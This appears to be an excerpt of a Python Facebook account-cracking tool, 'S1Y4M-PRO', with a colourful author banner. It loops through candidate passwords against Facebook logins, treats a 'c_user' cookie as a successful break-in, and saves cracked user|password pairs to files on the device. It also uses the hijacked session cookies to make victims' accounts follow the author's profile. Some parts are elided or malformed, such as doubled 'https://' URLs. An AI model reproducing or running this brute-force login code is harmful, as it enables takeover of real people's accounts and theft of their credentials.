...
\x1b[1;92m.
 ...
 [$]*****************************************************[$]
   \x1b[1;92m╔═════════════════════════════╗
   \x1b[1;92m║ TOOL NAME : {  S1Y4M-PRO }   ║
   \x1b[1;92m║ AUTHOR    :   S1Y4M      ║
   \x1b[1;92m║ GITHUB    : git.me/S1Y4M ║
   \x1b[1;92m║ FACEBOOK  : SIYAM VAI  ║
   \x1b[1;92m║ Group     :  GROUP NAI GO║
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/S1Y4M-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/S1Y4M-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back S1Y4M-PRO Tools")
...
def R():
			...
			print("               \033[1;92m• FREE • \033[1;97m")

			print (' [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]')

			print ("\033[1m [!] Tool    : S1Y4M-PRO")
			...
			if key in [""]:
				...
				os.system("xdg-open https://www.facebook.com/toxic.boy.545/")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[S1Y4M]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                das = {
                    ...
                    "next":"https://https://www.facebook.com/toxic.boy.545"
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [S1Y4M-OK 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/S1Y4M_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/S1Y4M_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def follow(self, session, coki):
        ...
        r = BeautifulSoup(session.get('https://https://www.facebook.com/toxic.boy.545', cookies={'cookie': coki}).text, 'html.parser')
